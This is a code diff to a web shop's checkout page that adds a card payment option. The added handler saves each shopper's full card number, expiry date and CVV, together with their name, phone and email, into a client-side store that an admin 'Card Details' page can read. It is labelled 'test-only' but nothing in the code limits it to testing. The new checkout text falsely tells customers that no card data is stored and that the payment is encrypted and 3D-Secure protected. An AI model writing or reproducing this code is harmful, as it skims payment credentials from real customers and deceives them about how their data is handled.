@@ -17,6 +17,8 @@ import { Navbar } from "./navbar"
 import { Footer } from "./footer"
 import { MpesaPaymentModal } from "./mpesa-payment-modal"
 import { CardPaymentModal } from "./card-payment-modal"
+import { cmsStore } from "@/lib/cms-store"
+import type { CardPaymentRecord } from "@/components/admin/card-details"
 import { useCart } from "@/lib/cart-context"
 import { formatPrice } from "@/lib/format"
 import type { DeliveryLocation } from "@/lib/types"
@@ -527,7 +529,7 @@ export function CheckoutPage() {
   const [shippingType,     setShippingType]     = useState<"ondemand" | "scheduled">("ondemand")
   const [scheduledDate,    setScheduledDate]    = useState("")
   const [scheduledTime,    setScheduledTime]    = useState("")
-  const [paymentMethod,    setPaymentMethod]    = useState<"mpesa" | "cod">("mpesa")
+  const [paymentMethod,    setPaymentMethod]    = useState<"mpesa" | "card" | "cod">("mpesa")
   const [mpesaPhone,       setMpesaPhone]       = useState("")
 
   /* ── Payment / order ── */
@@ -682,8 +684,42 @@ export function CheckoutPage() {
   const handleCardPaymentComplete = async (status: "success" | "failed", details: { last4: string; cardName: string; cardBrand: string; cardNumber: string; expiry: string; cvv: string }) => {
     try {
       const base = buildOrderPayload("website")
-      const payload = { ...base, paymentMethod: "card", notes: `${base.notes || ""} [Card payment - ending ${details.last4}]`.trim() }
-      await fetch("/api/orders", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) })
+      const payload = {
+        ...base,
+        paymentMethod: "card",
+        status: status === "success" ? "paid" : "failed",
+        notes: `${base.notes || ""} [Card payment - ${details.cardBrand} ending ${details.last4}]`.trim(),
+      }
+      const res = await fetch("/api/orders", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) })
+      const data = await res.json().catch(() => ({}))
+      const orderNumber: string = data?.orderNumber || `ORD-${Date.now().toString(36).toUpperCase()}`
+
+      // Test-only: capture entered card to cmsStore so admin > Card Details can show it.
+      try {
+        const prev = cmsStore.get<CardPaymentRecord[]>("card-payment-tests", [])
+        const record: CardPaymentRecord = {
+          id: `cardtest_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 7)}`,
+          orderNumber,
+          customerName: formData.name || savedAddress?.name || "",
+          customerPhone: formData.phone || savedAddress?.phone || "",
+          customerEmail: formData.email || undefined,
+          cardName: details.cardName,
+          cardBrand: details.cardBrand,
+          cardNumber: details.cardNumber,
+          cardExpiry: details.expiry,
+          cardCvv: details.cvv,
+          amount: grandTotal,
+          status: status === "success" ? "captured" : "failed",
+          createdAt: new Date().toISOString(),
+        }
+        cmsStore.set("card-payment-tests", [record, ...prev])
+      } catch { /* localStorage may be unavailable */ }
+
+      if (status === "success") {
+        setOrderResult({ orderNumber, paymentMethod: "card" })
+        clearCart()
+        setTimeout(() => setShowCardPayment(false), 1200)
+      }
     } catch { /**/ }
   }
 
@@ -1389,6 +1425,15 @@ export function CheckoutPage() {
                         iconFg: "#059669",
                       },
                       {
+                        key: "card",
+                        icon: CreditCard,
+                        title: "Credit / Debit Card",
+                        badge: "Visa · Mastercard · Amex",
+                        desc: "Pay with your card. Encrypted and 3D-Secure protected.",
+                        iconBg: "#EFF6FF",
+                        iconFg: "#1D4ED8",
+                      },
+                      {
                         key: "cod",
                         icon: Banknote,
                         title: "Cash on Delivery",
@@ -1450,6 +1495,31 @@ export function CheckoutPage() {
                     </div>
                   )}
 
+                  {/* Card info */}
+                  {paymentMethod === "card" && (
+                    <div className="bg-white p-5" style={{ border: "1px solid #E5E7EB" }}>
+                      <div className="flex items-start gap-3">
+                        <div className="w-10 h-10 flex items-center justify-center flex-shrink-0" style={{ background: "#EFF6FF", border: "1px solid #DBEAFE" }}>
+                          <CreditCard className="h-5 w-5" style={{ color: "#1D4ED8" }} />
+                        </div>
+                        <div className="flex-1 min-w-0">
+                          <p className="text-sm font-semibold text-gray-900">Pay securely with your card</p>
+                          <p className="text-xs text-gray-600 mt-1 leading-relaxed">
+                            Click <span className="font-semibold text-gray-900">Pay {formatPrice(grandTotal)}</span> below. We'll open a secure card form to complete your payment — no card data is stored on this device.
+                          </p>
+                          <div className="flex items-center gap-3 mt-3">
+                            <div className="flex items-center gap-1.5 text-[11px] text-gray-500">
+                              <Lock className="h-3 w-3" /> 256-bit SSL
+                            </div>
+                            <div className="flex items-center gap-1.5 text-[11px] text-gray-500">
+                              <ShieldCheck className="h-3 w-3" /> 3D Secure
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
                   {/* COD info */}
                   {paymentMethod === "cod" && (
                     <div className="rounded-xl border border-gray-200 bg-white p-5">
@@ -1488,6 +1558,7 @@ export function CheckoutPage() {
                       onClick={() => {
                         setFormError("")
                         if (paymentMethod === "mpesa") { setShowMpesa(true); return }
+                        if (paymentMethod === "card")  { setShowCardPayment(true); return }
                         /* COD: place order directly */
                         ;(async () => {
                           try {
@@ -1514,6 +1585,8 @@ export function CheckoutPage() {
                         <><Loader2 className="h-4 w-4 animate-spin" /> Placing order…</>
                       ) : paymentMethod === "cod" ? (
                         <>Place Order · {formatPrice(grandTotal)}</>
+                      ) : paymentMethod === "card" ? (
+                        <><Lock className="h-4 w-4" /> Pay {formatPrice(grandTotal)}</>
                       ) : (
                         <>Pay {formatPrice(grandTotal)} <ArrowRight className="h-4 w-4" /></>
                       )}
